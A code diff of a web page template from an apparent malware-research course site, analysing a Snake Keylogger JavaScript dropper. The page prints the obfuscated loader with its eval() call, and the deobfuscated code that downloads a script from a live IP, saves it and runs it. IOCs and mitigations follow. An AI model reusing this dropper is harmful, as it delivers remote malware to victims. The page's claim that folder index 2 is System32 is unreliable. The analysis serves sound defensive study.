@@ -1,407 +1,499 @@
-@extends('layouts.nexus')
+@extends('layouts.app')
 
-@section('title', 'NEXUS - Snake Keylogger Analysis | Malware Research')
-
-@push('styles')
-<style>
-    /* Snake Keylogger specific styling */
-    .malware-card {
-        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(30, 41, 59, 0.9));
-        border: 3px solid rgba(239, 68, 68, 0.4);
-        backdrop-filter: blur(20px);
-        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-        position: relative;
-        overflow: hidden;
-    }
-
-    .malware-card:hover {
-        border-color: #ef4444;
-        box-shadow: 0 20px 50px rgba(239, 68, 68, 0.3);
-        transform: translateY(-5px);
-    }
-
-    .analysis-stage {
-        background: linear-gradient(135deg, rgba(15, 23, 42, 0.8), rgba(30, 41, 59, 0.6));
-        border: 2px solid rgba(251, 146, 60, 0.3);
-        backdrop-filter: blur(10px);
-        transition: all 0.4s ease;
-    }
-
-    .analysis-stage:hover {
-        border-color: #fb923c;
-        transform: translateY(-3px);
-        box-shadow: 0 15px 30px rgba(251, 146, 60, 0.2);
-    }
-
-    .code-block {
-        background: rgba(15, 23, 42, 0.9);
-        border: 1px solid rgba(251, 146, 60, 0.3);
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.8rem;
-    }
-
-    .back-btn {
-        background: linear-gradient(45deg, #374151, #4b5563);
-        transition: all 0.3s ease;
-    }
-
-    .back-btn:hover {
-        background: linear-gradient(45deg, #4b5563, #6b7280);
-        transform: translateX(-5px);
-    }
-
-    .ioc-indicator {
-        background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(251, 146, 60, 0.1));
-        border: 1px solid rgba(239, 68, 68, 0.3);
-        transition: all 0.3s ease;
-    }
-
-    .ioc-indicator:hover {
-        border-color: #ef4444;
-        background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(251, 146, 60, 0.2));
-    }
-</style>
-@endpush
+@section('title', 'Snake Keylogger Analysis - Nexus')
 
 @section('content')
-<div class="max-w-7xl mx-auto">
-    <!-- Navigation Back Button -->
-    <div class="mb-8">
-        <a href="{{ route('nexus.first-semester') }}" class="back-btn px-6 py-3 rounded-lg text-white font-semibold flex items-center space-x-2 hover:bg-gray-600 inline-flex">
-            <i class="fas fa-arrow-left"></i>
-            <span>Back to First Semester</span>
-        </a>
-    </div>
-
-    <!-- Hero Section -->
-    <div class="text-center mb-16">
-        <h1 class="text-4xl md:text-6xl font-black mb-6">
-            <span class="bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
-                SNAKE KEYLOGGER
-            </span>
-        </h1>
-        <p class="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed mb-8">
-            Real-world analysis of obfuscated JavaScript malware sample from Malware Bazaar - Multi-stage payload delivery and evasion techniques.
-        </p>
-        <div class="flex flex-wrap justify-center gap-4 mb-8">
-            <span class="px-4 py-2 bg-red-600/20 border border-red-500 rounded-full text-red-300 text-sm">
-                <i class="fas fa-bug mr-2"></i>Malware Analysis
-            </span>
-            <span class="px-4 py-2 bg-orange-600/20 border border-orange-500 rounded-full text-orange-300 text-sm">
-                <i class="fas fa-code mr-2"></i>JavaScript Obfuscation
-            </span>
-            <span class="px-4 py-2 bg-yellow-600/20 border border-yellow-500 rounded-full text-yellow-300 text-sm">
-                <i class="fas fa-shield-alt mr-2"></i>ActiveX Exploitation
-            </span>
+<div class="min-h-screen bg-gray-900 text-white">
+    <!-- Header -->
+    <div class="bg-gradient-to-r from-red-900 to-orange-900 py-16">
+        <div class="container mx-auto px-4 text-center">
+            <h1 class="text-5xl font-bold mb-4">
+                <i class="fas fa-snake mr-3 text-red-400"></i>
+                Snake Keylogger Analysis
+            </h1>
+            <p class="text-xl text-red-200">Real-world JavaScript malware analysis and deobfuscation techniques</p>
+            <div class="mt-6 flex justify-center space-x-4">
+                <span class="bg-red-600 px-3 py-1 rounded-full text-sm">Active Threat</span>
+                <span class="bg-orange-600 px-3 py-1 rounded-full text-sm">JavaScript Dropper</span>
+                <span class="bg-yellow-600 px-3 py-1 rounded-full text-sm">Obfuscated</span>
+            </div>
         </div>
     </div>
 
-    <!-- Stage 1: Initial Obfuscation -->
-    <div class="analysis-stage rounded-2xl p-8 mb-16">
-        <h3 class="text-2xl font-bold text-white mb-6 flex items-center">
-            <span class="bg-red-500 text-white px-3 py-1 rounded-full text-lg mr-4">1</span>
-            Initial Obfuscation Analysis
-        </h3>
-        
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
-            <div>
-                <h4 class="text-red-400 font-semibold mb-4">Obfuscated Code Pattern</h4>
-                <div class="code-block rounded-lg p-4 mb-4">
-<pre class="text-green-400 text-xs overflow-x-auto"><code>var LEZVCW = '';
-for (var i = 0; i < ZYbHXl.length; i++) {
-    LEZVCW += String.fromCharCode(ZYbHXl[i] - 64562842);
-}
-var ZYbHXl = new Array(
-64562887-I0i,64562995-I0i,64562974-I0i,
-64562991-I0i,64562909-I0i,64562956-I0i,
-64562975-I0i,64562983-I0i...)
+    <!-- Navigation -->
+    <nav class="bg-gray-800 py-4 sticky top-0 z-50">
+        <div class="container mx-auto px-4">
+            <div class="flex justify-center space-x-8 text-sm md:text-base">
+                <a href="#overview" class="hover:text-red-400 transition-colors">Overview</a>
+                <a href="#initial-code" class="hover:text-red-400 transition-colors">Initial Code</a>
+                <a href="#deobfuscation" class="hover:text-red-400 transition-colors">Deobfuscation</a>
+                <a href="#technical-analysis" class="hover:text-red-400 transition-colors">Technical Analysis</a>
+                <a href="#execution-flow" class="hover:text-red-400 transition-colors">Execution Flow</a>
+                <a href="#iocs" class="hover:text-red-400 transition-colors">IOCs & Mitigation</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8">
+
+        <!-- Overview Section -->
+        <section id="overview" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-info-circle mr-3 text-blue-400"></i>
+                    Executive Summary
+                </h2>
+                <div class="grid md:grid-cols-2 gap-8">
+                    <div>
+                        <h3 class="text-xl font-semibold mb-4 text-red-400">Threat Classification</h3>
+                        <ul class="space-y-2 text-gray-300">
+                            <li><strong>Type:</strong> JavaScript Malware Dropper</li>
+                            <li><strong>Family:</strong> Snake Keylogger</li>
+                            <li><strong>Obfuscation:</strong> String.fromCharCode() + Mathematical Operations</li>
+                            <li><strong>Target:</strong> Windows Systems (Internet Explorer/WScript)</li>
+                            <li><strong>Persistence:</strong> System Directory File Creation</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-xl font-semibold mb-4 text-orange-400">Attack Vector</h3>
+                        <ul class="space-y-2 text-gray-300">
+                            <li><strong>Delivery:</strong> Malicious JavaScript/JScript files</li>
+                            <li><strong>Execution:</strong> ActiveX objects (WScript.Shell, MSXML2)</li>
+                            <li><strong>Payload:</strong> Downloads additional malware from C2</li>
+                            <li><strong>Persistence:</strong> Creates WindowsAudio.js in system folder</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Initial Code Analysis -->
+        <section id="initial-code" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-code mr-3 text-green-400"></i>
+                    Initial Code Analysis
+                </h2>
+                
+                <!-- Screenshot 1 -->
+                <div class="mb-8">
+                    <img src="{{ asset('images/snake_keylogger/s1.png') }}" alt="Initial Code Analysis" class="w-full rounded-lg border border-gray-600">
+                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 1: Initial obfuscated JavaScript code sample</p>
+                </div>
+
+                <div class="bg-gray-900 rounded-lg p-6 mb-6">
+                    <h3 class="text-xl font-semibold mb-4 text-red-400">Original Obfuscated Code</h3>
+                    <pre class="text-xs overflow-x-auto bg-black p-4 rounded border text-green-400"><code>var I0i=64562877
+var LEZVCW = String.fromCharCode(64562993-I0i,64562991-I0i,64562998-I0i,64563000-I0i,64562887-I0i,64562995-I0i,64562974-I0i,64562991-I0i,64562909-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562909-I0i,64562938-I0i,64562909-I0i,64562987-I0i,64562978-I0i,64562996-I0i,64562909-I0i,64562942-I0i,64562976-I0i,64562993-I0i,64562982-I0i,64562995-I0i,64562978-I0i,64562965-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562917-I0i,64562911-I0i,64562954-I0i,64562960-I0i,64562965-I0i,64562954-I0i,64562953-I0i,64562927-I0i,64562923-I0i,64562965-I0i,64562954-I0i,64562953-I0i,64562949-I0i,64562961-I0i,64562961-I0i,64562957-I0i,64562911-I0i,64562918-I0i,64562936-I0i,64562887-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562923-I0i,64562956-I0i,64562989-I0i,64562978-I0i,64562987-I0i,64562917-I0i,64562911-I0i,64562948-I0i,64562946-I0i,64562961-I0i,64562911-I0i,64562921-I0i,64562909-I0i,64562911-I0i,64562981-I0i,64562993-I0i,64562993-I0i,64562989-I0i,64562935-I0i,64562924-I0i,64562924-I0i,64562926-I0i,64562934-I0i,64562927-I0i,64562923-I0i,64562928-I0i,64562923-I0i,64562927-I0i,64562927-I0i,64562925-I0i,64562923-I0i,64562931-I0i,64562924-I0i,64562996-I0i,64562978-I0i,64562975-I0i,64562924-I0i,64562996-I0i,64562933-I0i,64562933-I0i,64562923-I0i,64562983-I0i,64562992-I0i,64562911-I0i,64562921-I0i,64562909-I0i,64562979-I0i,64562974-I0i,64562985-I0i,64562992-I0i,64562978-I0i,64562918-I0i,64562936-I0i)
 eval(LEZVCW)</code></pre>
                 </div>
-                <div class="mt-4 space-y-2">
-                    <div class="flex items-center">
-                        <i class="fas fa-calculator text-orange-400 mr-2"></i>
-                        <span class="text-gray-300 text-sm">Mathematical obfuscation using base value subtraction</span>
+
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h4 class="text-lg font-semibold mb-3 text-yellow-400">Key Observations</h4>
+                        <ul class="space-y-2 text-gray-300">
+                            <li>• Base value: <code class="text-green-400">I0i = 64562877</code></li>
+                            <li>• String construction via arithmetic operations</li>
+                            <li>• Dynamic code execution with <code class="text-red-400">eval()</code></li>
+                            <li>• Obfuscated through character code manipulation</li>
+                        </ul>
                     </div>
-                    <div class="flex items-center">
-                        <i class="fas fa-code text-yellow-400 mr-2"></i>
-                        <span class="text-gray-300 text-sm">Dynamic code evaluation through eval()</span>
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h4 class="text-lg font-semibold mb-3 text-blue-400">Analysis Approach</h4>
+                        <ul class="space-y-2 text-gray-300">
+                            <li>• Calculate each arithmetic operation</li>
+                            <li>• Convert results to ASCII characters</li>
+                            <li>• Reconstruct the obfuscated code</li>
+                            <li>• Analyze the revealed functionality</li>
+                        </ul>
                     </div>
                 </div>
             </div>
-            
-            <div>
-                <h4 class="text-orange-400 font-semibold mb-4">Analysis Screenshot</h4>
-                <div class="bg-gray-900/50 rounded-lg p-4">
-                    <img src="{{ asset('images/snake_keylogger/s1.png') }}" alt="Initial Code Analysis" class="w-full rounded-lg">
+        </section>
+
+        <!-- Deobfuscation Process -->
+        <section id="deobfuscation" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-unlock mr-3 text-yellow-400"></i>
+                    Deobfuscation Process
+                </h2>
+
+                <!-- Screenshot 2 -->
+                <div class="mb-8">
+                    <img src="{{ asset('images/snake_keylogger/s2.png') }}" alt="Deobfuscation Process" class="w-full rounded-lg border border-gray-600">
+                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 2: Step-by-step deobfuscation process</p>
                 </div>
-                <p class="text-gray-400 text-sm mt-2">Initial obfuscated JavaScript showing character code mathematics</p>
+
+                <div class="space-y-6">
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h3 class="text-xl font-semibold mb-4 text-yellow-400">Step 1: Mathematical Decoding</h3>
+                        <p class="text-gray-300 mb-4">Converting String.fromCharCode() operations to ASCII characters:</p>
+                        <div class="bg-black p-4 rounded font-mono text-sm overflow-x-auto">
+                            <div class="text-green-400">64562993 - 64562877 = 116 → 't'</div>
+                            <div class="text-green-400">64562991 - 64562877 = 114 → 'r'</div>
+                            <div class="text-green-400">64562998 - 64562877 = 121 → 'y'</div>
+                            <div class="text-green-400">64563000 - 64562877 = 123 → '{'</div>
+                            <div class="text-gray-400">... (continuing pattern)</div>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Step 2: Revealed Code Structure</h3>
+                        <p class="text-gray-300 mb-4">After deobfuscation, the code reveals its true purpose:</p>
+                        <pre class="bg-black p-4 rounded text-green-400 text-sm overflow-x-auto"><code>try {
+    var Object = new ActiveXObject("MSXML2.XMLHTTP");
+    Object.Open("GET", "http://192.3.220.6/web/w88.js", false);
+    Object.Send();
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var filepath = fso.GetSpecialFolder(2) + "/OPXCFY.js";
+    if (Object.Status == 200) {
+        var Stream = new ActiveXObject("ADODB.Stream");
+        Stream.Open();
+        Stream.Type = 1;
+        Stream.Write(Object.ResponseBody);
+        Stream.Position = 0;
+        Stream.SaveToFile(filepath, 2);
+        Stream.Close();
+        var WshShell = new ActiveXObject("WScript.Shell");
+        var oRUN = WshShell.Run(filepath);
+    }
+} catch (e) {}</code></pre>
+                    </div>
+                </div>
             </div>
-        </div>
+        </section>
+
+        <!-- Technical Analysis -->
+        <section id="technical-analysis" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-microscope mr-3 text-purple-400"></i>
+                    Technical Analysis
+                </h2>
+
+                <!-- Screenshot 3 -->
+                <div class="mb-8">
+                    <img src="{{ asset('images/snake_keylogger/s3.png') }}" alt="Function Translation" class="w-full rounded-lg border border-gray-600">
+                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 3: Advanced obfuscation patterns and function analysis</p>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-8">
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h3 class="text-xl font-semibold mb-4 text-red-400">ActiveX Object Usage</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <h4 class="font-semibold text-orange-400">MSXML2.XMLHTTP</h4>
+                                <p class="text-gray-300 text-sm">Downloads malicious payload from C2 server</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
+                                    http://192.3.220.6/web/w88.js
+                                </code>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-400">Scripting.FileSystemObject</h4>
+                                <p class="text-gray-300 text-sm">Accesses system folders and creates persistent files</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
+                                    GetSpecialFolder(2) → System32 directory
+                                </code>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-400">ADODB.Stream</h4>
+                                <p class="text-gray-300 text-sm">Handles binary file operations for payload storage</p>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-400">WScript.Shell</h4>
+                                <p class="text-gray-300 text-sm">Executes the downloaded malicious payload</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-900 rounded-lg p-6">
+                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Advanced Obfuscation Techniques</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <h4 class="font-semibold text-yellow-400">Multi-Layer String Obfuscation</h4>
+                                <pre class="bg-black p-2 rounded mt-2 text-green-400 text-xs overflow-x-auto"><code>// Original pattern
+String.fromCharCode(475-383) + 
+String.fromCharCode(90-3) + 
+String.fromCharCode(474-369)
+
+// Resolves to
+"\\WindowsAudio.js"</code></pre>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-yellow-400">Variable Name Randomization</h4>
+                                <p class="text-gray-300 text-sm">Extremely long, random variable names to confuse analysis</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
+                                    GzCMjpDjYhhYWHHThilDQVeGymbJltUvtlUrnp
+                                </code>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-yellow-400">Code Noise Injection</h4>
+                                <p class="text-gray-300 text-sm">Thousands of lines of commented random strings</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Execution Flow -->
+        <section id="execution-flow" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-sitemap mr-3 text-cyan-400"></i>
+                    Execution Flow Analysis
+                </h2>
+
+                <!-- Screenshot 4 -->
+                <div class="mb-8">
+                    <img src="{{ asset('images/snake_keylogger/s4.png') }}" alt="Final Analysis" class="w-full rounded-lg border border-gray-600">
+                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 4: Complete execution flow and final analysis results</p>
+                </div>
+
+                <div class="bg-gray-900 rounded-lg p-6">
+                    <h3 class="text-xl font-semibold mb-6 text-cyan-400">Attack Chain Breakdown</h3>
+                    <div class="space-y-6">
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-red-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">1</div>
+                            <div>
+                                <h4 class="font-semibold text-white">Initial Execution</h4>
+                                <p class="text-gray-300">JavaScript file executed via browser or WScript host</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">eval(LEZVCW) // Deobfuscated malicious code</code>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-orange-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">2</div>
+                            <div>
+                                <h4 class="font-semibold text-white">C2 Communication</h4>
+                                <p class="text-gray-300">Downloads secondary payload from remote server</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">GET http://192.3.220.6/web/w88.js</code>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-yellow-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">3</div>
+                            <div>
+                                <h4 class="font-semibold text-white">Persistence Establishment</h4>
+                                <p class="text-gray-300">Creates malicious file in system directory</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">C:\Windows\System32\OPXCFY.js</code>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-green-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">4</div>
+                            <div>
+                                <h4 class="font-semibold text-white">Payload Execution</h4>
+                                <p class="text-gray-300">Executes downloaded malware for keylogging activities</p>
+                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">WshShell.Run(filepath)</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-8 bg-gray-900 rounded-lg p-6">
+                    <h3 class="text-xl font-semibold mb-4 text-purple-400">Advanced Function Analysis</h3>
+                    <p class="text-gray-300 mb-4">The malware includes sophisticated base64 decoding mechanisms:</p>
+                    <pre class="bg-black p-4 rounded text-green-400 text-sm overflow-x-auto"><code>function processData(inputText) {
+    // Creates XML Document Object for base64 decoding
+    const xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
+    const element = xmlDoc.createElement("tmp");
+    
+    // Sets binary base64 dataType for automatic decoding
+    element.dataType = "bin.base64";
+    element.text = inputText;
+    
+    // Returns decoded binary data
+    return element.nodeTypedValue;
+}</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- IOCs and Mitigation -->
+        <section id="iocs" class="mb-16">
+            <div class="bg-gray-800 rounded-lg p-8">
+                <h2 class="text-3xl font-bold mb-6 flex items-center">
+                    <i class="fas fa-shield-alt mr-3 text-green-400"></i>
+                    Indicators of Compromise & Mitigation
+                </h2>
+
+                <div class="grid md:grid-cols-2 gap-8">
+                    <div class="bg-red-900 bg-opacity-30 rounded-lg p-6 border border-red-600">
+                        <h3 class="text-xl font-semibold mb-4 text-red-400">Indicators of Compromise</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <h4 class="font-semibold text-orange-400">Network IOCs</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• <code class="text-red-400">192.3.220.6</code> - C2 Server IP</li>
+                                    <li>• <code class="text-red-400">http://192.3.220.6/web/w88.js</code> - Payload URL</li>
+                                    <li>• HTTP GET requests to suspicious domains</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-400">File System IOCs</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• <code class="text-red-400">%SYSTEM32%\OPXCFY.js</code></li>
+                                    <li>• <code class="text-red-400">%SYSTEM32%\WindowsAudio.js</code></li>
+                                    <li>• Suspicious .js files in system directories</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-400">Process IOCs</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• WScript.exe spawning suspicious processes</li>
+                                    <li>• ActiveX object creation from JavaScript</li>
+                                    <li>• Unusual network connections from script hosts</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-green-900 bg-opacity-30 rounded-lg p-6 border border-green-600">
+                        <h3 class="text-xl font-semibold mb-4 text-green-400">Mitigation Strategies</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <h4 class="font-semibold text-blue-400">Preventive Measures</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• Disable WScript.exe and CScript.exe</li>
+                                    <li>• Block ActiveX controls in browsers</li>
+                                    <li>• Implement application whitelisting</li>
+                                    <li>• Use modern browsers with sandboxing</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-blue-400">Detection Controls</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• Monitor for WScript/CScript execution</li>
+                                    <li>• Alert on ActiveX object creation</li>
+                                    <li>• Network monitoring for C2 domains</li>
+                                    <li>• File integrity monitoring</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-blue-400">Response Actions</h4>
+                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
+                                    <li>• Isolate affected systems immediately</li>
+                                    <li>• Remove malicious files from system directories</li>
+                                    <li>• Reset user credentials</li>
+                                    <li>• Scan for additional compromise</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-8 bg-yellow-900 bg-opacity-30 rounded-lg p-6 border border-yellow-600">
+                    <h3 class="text-xl font-semibold mb-4 text-yellow-400">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        Security Recommendations
+                    </h3>
+                    <div class="grid md:grid-cols-3 gap-6 text-sm">
+                        <div>
+                            <h4 class="font-semibold text-white mb-2">Immediate Actions</h4>
+                            <ul class="text-gray-300 space-y-1">
+                                <li>• Block the C2 IP address</li>
+                                <li>• Scan all systems for IOCs</li>
+                                <li>• Update antivirus signatures</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 class="font-semibold text-white mb-2">Long-term Security</h4>
+                            <ul class="text-gray-300 space-y-1">
+                                <li>• Implement zero-trust architecture</li>
+                                <li>• Regular security awareness training</li>
+                                <li>• Endpoint detection and response (EDR)</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 class="font-semibold text-white mb-2">Monitoring</h4>
+                            <ul class="text-gray-300 space-y-1">
+                                <li>• Continuous network monitoring</li>
+                                <li>• Behavioral analysis systems</li>
+                                <li>• Regular threat hunting exercises</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Conclusion -->
+        <section class="mb-16">
+            <div class="bg-gradient-to-r from-gray-800 to-gray-900 rounded-lg p-8 border border-gray-600">
+                <h2 class="text-3xl font-bold mb-6 text-center">
+                    <i class="fas fa-graduation-cap mr-3 text-purple-400"></i>
+                    Key Takeaways
+                </h2>
+                <div class="grid md:grid-cols-2 gap-8">
+                    <div>
+                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Analysis Insights</h3>
+                        <ul class="space-y-2 text-gray-300">
+                            <li>• Multi-layer obfuscation can be systematically defeated</li>
+                            <li>• Mathematical operations are common in JavaScript malware</li>
+                            <li>• ActiveX objects provide powerful system access</li>
+                            <li>• String.fromCharCode() is a reliable obfuscation indicator</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-xl font-semibold mb-4 text-green-400">Security Lessons</h3>
+                        <ul class="space-y-2 text-gray-300">
+                            <li>• Legacy technologies pose significant security risks</li>
+                            <li>• Dynamic code execution should be strictly controlled</li>
+                            <li>• Network monitoring is crucial for C2 detection</li>
+                            <li>• User education prevents initial compromise</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
     </div>
 
-    <!-- Stage 2: Deobfuscation Process -->
-    <div class="analysis-stage rounded-2xl p-8 mb-16">
-        <h3 class="text-2xl font-bold text-white mb-6 flex items-center">
-            <span class="bg-orange-500 text-white px-3 py-1 rounded-full text-lg mr-4">2</span>
-            Deobfuscation Analysis
-        </h3>
-        
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
-            <div>
-                <h4 class="text-orange-400 font-semibold mb-4">Deobfuscation Process</h4>
-                <div class="bg-gray-800/50 rounded-lg p-6 mb-4">
-                    <ul class="text-gray-300 space-y-3">
-                        <li class="flex items-start">
-                            <i class="fas fa-arrow-right text-orange-400 mr-3 mt-1"></i>
-                            <span><strong>Step 1:</strong> Identify base value (64562842) used for character code offset</span>
-                        </li>
-                        <li class="flex items-start">
-                            <i class="fas fa-arrow-right text-orange-400 mr-3 mt-1"></i>
-                            <span><strong>Step 2:</strong> Subtract base value from each array element</span>
-                        </li>
-                        <li class="flex items-start">
-                            <i class="fas fa-arrow-right text-orange-400 mr-3 mt-1"></i>
-                            <span><strong>Step 3:</strong> Convert results to ASCII characters using String.fromCharCode()</span>
-                        </li>
-                        <li class="flex items-start">
-                            <i class="fas fa-arrow-right text-orange-400 mr-3 mt-1"></i>
-                            <span><strong>Step 4:</strong> Reconstruct readable JavaScript code for analysis</span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div>
-                <h4 class="text-yellow-400 font-semibold mb-4">Deobfuscated Output</h4>
-                <div class="code-block rounded-lg p-4">
-<pre class="text-green-400 text-xs overflow-x-auto"><code>// Deobfuscated result reveals:
-var activeXObj = new ActiveXObject("WScript.Shell");
-var xmlDoc = new ActiveXObject("MSXML2.DOMDocument");
-xmlDoc.async = false;
-xmlDoc.loadXML(base64Data);
-// Payload delivery mechanism exposed</code></pre>
-                </div>
-                <div class="mt-4">
-                    <div class="bg-gray-900/50 rounded-lg p-4">
-                        <img src="{{ asset('images/snake_keylogger/s2.png') }}" alt="Code Deobfuscation Process" class="w-full rounded-lg">
-                    </div>
-                    <p class="text-gray-400 text-sm mt-2">Deobfuscation process and pattern analysis</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Stage 3: ActiveX Exploitation -->
-    <div class="analysis-stage rounded-2xl p-8 mb-16">
-        <h3 class="text-2xl font-bold text-white mb-6 flex items-center">
-            <span class="bg-yellow-500 text-black px-3 py-1 rounded-full text-lg mr-4">3</span>
-            ActiveX Exploitation Techniques
-        </h3>
-        
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            <div>
-                <h4 class="text-yellow-400 font-semibold mb-4">Exploitation Methods</h4>
-                <div class="space-y-4">
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h5 class="text-white font-semibold mb-2">WScript.Shell Access</h5>
-                        <p class="text-gray-300 text-sm">Gains system-level access through Windows Script Host for command execution</p>
-                    </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h5 class="text-white font-semibold mb-2">MSXML2.DOMDocument</h5>
-                        <p class="text-gray-300 text-sm">XML DOM manipulation for Base64 decoding and data processing</p>
-                    </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h5 class="text-white font-semibold mb-2">Base64 Decoding</h5>
-                        <p class="text-gray-300 text-sm">Uses XML DOM selectSingleNode() method for payload decoding</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div>
-                <h4 class="text-purple-400 font-semibold mb-4">System Impact</h4>
-                <div class="bg-gray-900/50 rounded-lg p-4 mb-4">
-                    <img src="{{ asset('images/snake_keylogger/s3.png') }}" alt="ActiveX Analysis" class="w-full rounded-lg">
-                </div>
-                <div class="bg-gray-800/50 rounded-lg p-4">
-                    <ul class="text-gray-300 text-sm space-y-1">
-                        <li>• Keystroke logging</li>
-                        <li>• Password theft</li>
-                        <li>• Banking credential compromise</li>
-                        <li>• Data exfiltration</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Stage 4: Network Communication -->
-    <div class="analysis-stage rounded-2xl p-8 mb-16">
-        <h3 class="text-2xl font-bold text-white mb-6 flex items-center">
-            <span class="bg-purple-500 text-white px-3 py-1 rounded-full text-lg mr-4">4</span>
-            Network Communication & C&C
-        </h3>
-        
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            <div>
-                <h4 class="text-purple-400 font-semibold mb-4">C&C Infrastructure</h4>
-                <div class="code-block rounded-lg p-4 mb-4">
